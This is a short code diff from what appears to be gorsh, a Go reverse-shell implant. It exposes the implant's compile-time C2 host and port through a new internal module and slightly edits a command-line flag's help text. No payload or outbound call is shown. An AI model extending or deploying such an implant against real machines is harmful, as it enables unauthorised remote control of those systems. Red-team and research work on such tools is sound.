@@ -7,6 +7,7 @@ import (
 	"strings"
 
 	"github.com/audibleblink/gorsh/internal/core"
+	"github.com/audibleblink/gorsh/internal/myconn"
 )
 
 const (
@@ -21,7 +22,11 @@ var (
 )
 
 func main() {
-	dev := flag.Bool("dev", false, "Run the shell locally")
+	// make this accessible globally, through a module, so other parts
+	// can reference the built in C2 host:port
+	myconn.ConnectionString = connectString
+
+	dev := flag.Bool("dev", false, "Run the shell locally.")
 	override := flag.String("connect", "", "Override compile-time-injected connectString")
 	flag.Parse()
 
